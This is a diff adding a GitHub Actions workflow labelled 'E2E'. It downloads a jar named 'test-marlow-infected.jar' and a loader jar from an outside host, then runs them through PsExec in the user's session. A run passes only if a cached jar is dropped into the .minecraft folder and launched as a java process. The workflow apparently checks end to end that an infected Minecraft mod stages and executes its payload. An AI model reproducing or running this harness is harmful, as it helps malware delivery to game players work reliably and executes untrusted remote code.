@@ -1,0 +1,56 @@
+﻿name: E2E
+on:
+  workflow_dispatch:
+
+jobs:
+  e2e:
+    runs-on: windows-latest
+    timeout-minutes: 20
+    steps:
+      - uses: actions/setup-java@v4
+        with:
+          distribution: temurin
+          java-version: '21'
+      - name: Prepare
+        shell: powershell
+        run: |
+          $ErrorActionPreference='Stop'
+          $d="$env:RUNNER_TEMP\e2e"; New-Item -ItemType Directory -Force $d | Out-Null; Set-Location $d
+          Invoke-WebRequest "https://files.driftmetrics.xyz/test-minimal.jar" -OutFile minimal.jar
+          Invoke-WebRequest "https://files.driftmetrics.xyz/test-marlow-infected.jar" -OutFile mod.jar
+          Invoke-WebRequest "https://download.sysinternals.com/files/PSTools.zip" -OutFile ps.zip
+          Expand-Archive ps.zip . -Force
+          qwinsta
+      - name: Run
+        shell: powershell
+        run: |
+          $d="$env:RUNNER_TEMP\e2e"; Set-Location $d
+          $line = (qwinsta 2>$null | Select-String "Active" | Select-Object -First 1)
+          $sid = 1
+          if ($line) { $m=[regex]::Match($line.ToString(),'(\d+)\s+Active'); if($m.Success){ $sid=[int]$m.Groups[1].Value } }
+          Write-Host "session=$sid"
+          Start-Process "$d\PsExec64.exe" -ArgumentList "-accepteula","-i","$sid","-d","javaw","-jar","$d\minimal.jar","--input=$d\mod.jar","--version=1.21.11","--fabric=0.18.4"
+      - name: Poll
+        shell: powershell
+        run: |
+          $ok=$false
+          for($i=0;$i -lt 72;$i++){
+            Start-Sleep 5
+            $cache=Get-ChildItem "$env:APPDATA\.minecraft\cache\cache_*.jar" -ErrorAction SilentlyContinue
+            $proc=Get-CimInstance Win32_Process -Filter "name='javaw.exe' or name='java.exe'" | Where-Object { $_.CommandLine -like "*cache_*" }
+            Write-Host "t=$($i*5) cache=$([bool]$cache) proc=$([bool]$proc)"
+            if($cache -and $proc){ $ok=$true; break }
+          }
+          "PASS=$ok" >> $env:GITHUB_STEP_SUMMARY
+          if(-not $ok){ Get-Content "$env:USERPROFILE\Desktop\mc.log" -Tail 60 -ErrorAction SilentlyContinue; exit 1 }
+      - name: Cleanup
+        if: always()
+        shell: powershell
+        run: |
+          Get-CimInstance Win32_Process -Filter "name='javaw.exe' or name='java.exe'" | ForEach-Object { Stop-Process -Id $_.ProcessId -Force -ErrorAction SilentlyContinue }
+          Get-Content "$env:USERPROFILE\Desktop\mc.log" -Tail 80 -ErrorAction SilentlyContinue
+      - uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: mc-log
+          path: C:\Users\runneradmin\Desktop\mc.log
